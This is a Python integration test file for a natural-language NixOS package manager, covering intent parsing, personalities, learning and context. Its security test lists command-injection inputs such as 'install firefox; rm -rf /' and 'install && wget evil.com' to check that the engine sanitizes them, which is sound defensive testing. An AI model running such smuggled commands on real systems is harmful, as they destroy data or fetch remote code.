#!/usr/bin/env python3
"""
import subprocess
Integration tests for the CLI → Core → Executor pipeline.
Tests the complete flow from user input to command execution.
"""

import unittest
import tempfile
import os
import sys
from unittest.mock import patch, MagicMock
from io import StringIO

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from luminous_nix.api.schema import Request, Response, Context, ExecutionResult, Plan, Command
from luminous_nix.core.intents import Intent, IntentType
from luminous_nix.core.engine import NixForHumanityBackend as Engine
from luminous_nix.core.interface import Query

class TestCLICorePipeline(unittest.TestCase):
    """Test the complete pipeline from CLI input to execution."""
    
    def setUp(self):
        """Set up test fixtures."""
        # Create temporary database
        self.temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        
        # Initialize engine with config
        config = {
            'knowledge_db_path': self.temp_db.name,
            'dry_run': True,
            'default_personality': 'friendly'
        }
        self.engine = Engine(config)
    
    def tearDown(self):
        """Clean up test fixtures."""
        self.temp_db.close()
        os.unlink(self.temp_db.name)
    
    def test_simple_install_command_flow(self):
        """Test complete flow for a simple install command."""
        # Create real Request object
        request = Request(
            query="install firefox",
            context=Context(
                execute=False,
                dry_run=True,
                personality="friendly"
            )
        )
        
        # Process through engine
        response = self.engine.process(request)
        
        # Verify response is a real Response object
        self.assertIsInstance(response, Response)
        
        # Verify response structure
        self.assertIsNotNone(response.intent)
        self.assertIsNotNone(response.text)
        self.assertTrue(response.success)
        
        # Verify intent recognition
        self.assertEqual(response.intent.type, IntentType.INSTALL)
        self.assertIn('firefox', response.intent.entities.get('package', ''))
        
        # Verify command generation
        self.assertTrue(len(response.commands) > 0 or response.plan is not None)
        if response.commands:
            command_text = str(response.commands[0])
            self.assertTrue(
                'nix-env -iA' in command_text or
                'firefox' in command_text
            )
        elif response.plan:
            self.assertTrue(any('firefox' in step for step in response.plan.steps))
    
    def test_natural_language_install_flow(self):
        """Test flow with natural language input."""
        # Create request with natural language
        request = Request(
            query="I need a web browser please",
            context=Context(dry_run=True, personality="friendly")
        )
        
        response = self.engine.process(request)
        
        # Should recognize install intent
        self.assertIsInstance(response, Response)
        self.assertEqual(response.intent.type, IntentType.INSTALL)
        
        # Should suggest browsers
        self.assertIsNotNone(response.text)
        response_lower = response.text.lower()
        self.assertTrue(
            'firefox' in response_lower or
            'chrome' in response_lower or
            'browser' in response_lower
        )
        
        # Should have suggestions
        if response.suggestions:
            self.assertTrue(any('browser' in s.lower() for s in response.suggestions))
    
    def test_error_handling_flow(self):
        """Test error handling through the pipeline."""
        # Invalid command
        request = Request(
            query="install nonexistent-package-12345",
            context=Context(dry_run=True)
        )
        
        response = self.engine.process(request)
        
        # Should handle gracefully
        self.assertIsInstance(response, Response)
        
        # Should provide suggestions or handle the error
        if not response.success:
            self.assertIsNotNone(response.error)
        else:
            # May succeed but provide alternatives
            self.assertTrue(len(response.suggestions) > 0)
        
        # Error message should be user-friendly
        if response.error:
            self.assertNotIn('ENOENT', response.error)  # No technical jargon
    
    @patch('subprocess.run')
    def test_command_execution_integration(self, mock_run):
        """Test actual command execution with mocked subprocess."""
        # Create engine with execution enabled
        config = {
            'knowledge_db_path': self.temp_db.name,
            'dry_run': False,  # Enable execution for this test
            'default_personality': 'friendly'
        }
        engine = Engine(config)
        
        # Mock successful execution
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Package installed successfully",
            stderr=""
        )
        
        # Create request with execution enabled
        request = Request(
            query="install vim",
            context=Context(execute=True)
        )
        
        response = engine.process(request)
        
        # Verify subprocess was called
        mock_run.assert_called_once()
        args = mock_run.call_args[0][0]
        
        # Verify safe command construction
        self.assertIsInstance(args, list)  # Not shell string
        self.assertIn('nix-env', args[0])
        self.assertIn('vim', ' '.join(args))
        
        # Verify response
        self.assertIsInstance(response, Response)
        if response.result:
            self.assertEqual(response.result.success, True)
        else:
            self.assertTrue(response.success)
    
    def test_personality_integration(self):
        """Test personality system integration in pipeline."""
        # Test different personalities
        personalities = ['minimal', 'friendly', 'technical']
        
        for personality in personalities:
            # Create request with specific personality
            request = Request(
                query="install firefox",
                context=Context(
                    personality=personality
                )
            )
            
            response = self.engine.process(request)
            
            # Verify response reflects personality
            self.assertIsInstance(response, Response)
            self.assertIsNotNone(response.text)
            
            if personality == 'minimal':
                # Should be concise
                self.assertLess(len(response.text), 100)
            elif personality == 'friendly':
                # Should have friendly language
                self.assertTrue(
                    'help' in response.text.lower() or
                    'happy' in response.text.lower() or
                    '!' in response.text
                )
    
    def test_learning_system_integration(self):
        """Test learning system feedback loop."""
        # First command
        request1 = Request(
            query="install firefox",
            context=Context(dry_run=True)
        )
        response1 = self.engine.process(request1)
        
        # Provide feedback
        if hasattr(self.engine, 'learning_system') and response1.intent:
            self.engine.learning_system.record_feedback(
                response1.intent,
                response1.commands[0] if response1.commands else None,
                'positive'
            )
        
        # Similar command should benefit from learning
        request2 = Request(
            query="get firefox",
            context=Context(dry_run=True)
        )
        response2 = self.engine.process(request2)
        
        # Should recognize pattern
        self.assertEqual(response2.intent.type, IntentType.INSTALL)
        self.assertIn('firefox', response2.intent.entities.get('package', ''))
    
    def test_context_preservation(self):
        """Test context preservation across commands."""
        # First command establishes context
        request1 = Request(
            query="search for text editors",
            context=Context(dry_run=True)
        )
        response1 = self.engine.process(request1)
        
        # Follow-up command uses context
        request2 = Request(
            query="install the first one",
            context=Context(
                dry_run=True,
                user_preferences={'last_search': 'text editors'}
            )
        )
        response2 = self.engine.process(request2)
        
        # Should understand context
        self.assertEqual(response2.intent.type, IntentType.INSTALL)
        # Should reference previous search
        if response2.intent.entities.get('package'):
            common_editors = ['vim', 'emacs', 'nano', 'neovim']
            package = response2.intent.entities['package'].lower()
            self.assertTrue(any(editor in package for editor in common_editors))
    
    def test_security_validation_integration(self):
        """Test security measures in pipeline."""
        # Dangerous inputs
        dangerous_inputs = [
            "install firefox; rm -rf /",
            "install `malicious command`",
            "install $(dangerous)",
            "install && wget evil.com"
        ]
        
        for dangerous_input in dangerous_inputs:
            request = Request(
                query=dangerous_input,
                context=Context(dry_run=True)
            )
            response = self.engine.process(request)
            
            # Should be blocked or sanitized
            if response.error:
                self.assertIn('security', response.error.lower())
            
            # Should not generate unsafe command
            if response.commands:
                command_str = str(response.commands[0])
                self.assertNotIn(';', command_str)
                self.assertNotIn('`', command_str)
                self.assertNotIn('$', command_str)


if __name__ == '__main__':
    unittest.main()